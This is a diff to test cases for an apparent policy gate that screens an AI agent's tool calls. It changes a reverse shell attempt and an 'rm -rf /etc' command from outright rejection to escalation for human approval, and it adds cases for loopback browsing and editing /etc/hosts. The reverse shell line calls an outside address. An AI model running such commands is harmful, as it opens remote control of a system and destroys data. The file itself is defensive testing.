@@ -20,13 +20,13 @@ describe('PolicyGate', () => {
       expect(verdict.riskScore).toBeLessThanOrEqual(30);
     });
 
-    it('should reject reverse shell attempts', () => {
+    it('should escalate reverse shell attempts to HITL instead of auto-rejecting them', () => {
       const verdict = gate.evaluate({
         correlationId: 'c2',
         toolName: 'exec',
         toolInput: { command: 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' },
       });
-      expect(verdict.verdict).toBe('reject');
+      expect(verdict.verdict).toBe('ask');
       expect(verdict.riskScore).toBeGreaterThan(90);
     });
 
@@ -36,7 +36,7 @@ describe('PolicyGate', () => {
         toolName: 'exec',
         toolInput: { command: 'rm -rf /etc' },
       });
-      expect(['ask', 'reject']).toContain(verdict.verdict);
+      expect(verdict.verdict).toBe('ask');
       expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
     });
 
@@ -58,6 +58,16 @@ describe('PolicyGate', () => {
       expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
     });
 
+    it('should approve loopback browser navigation inside the sandbox VM', () => {
+      const verdict = gate.evaluate({
+        correlationId: 'c5-browser',
+        toolName: 'browser',
+        toolInput: { action: 'navigate', url: 'http://127.0.0.1:8765/report.html' },
+      });
+      expect(verdict.verdict).toBe('approve');
+      expect(verdict.riskScore).toBeLessThanOrEqual(30);
+    });
+
     it('should reject disabled gateway tool calls', () => {
       const verdict = gate.evaluate({
         correlationId: 'c6',
@@ -67,6 +77,17 @@ describe('PolicyGate', () => {
       expect(verdict.verdict).toBe('reject');
       expect(verdict.riskScore).toBe(100);
       expect(verdict.triggeredRules).toContain('boundary:disabled_tool');
+    });
+
+    it('should keep high-risk sandbox-local tools available for approval workflows', () => {
+      const verdict = gate.evaluate({
+        correlationId: 'c7',
+        toolName: 'write',
+        toolInput: { path: '/etc/hosts', content: '127.0.0.1 localhost' },
+      });
+
+      expect(verdict.verdict).toBe('ask');
+      expect(verdict.riskScore).toBeGreaterThan(70);
     });
   });
 
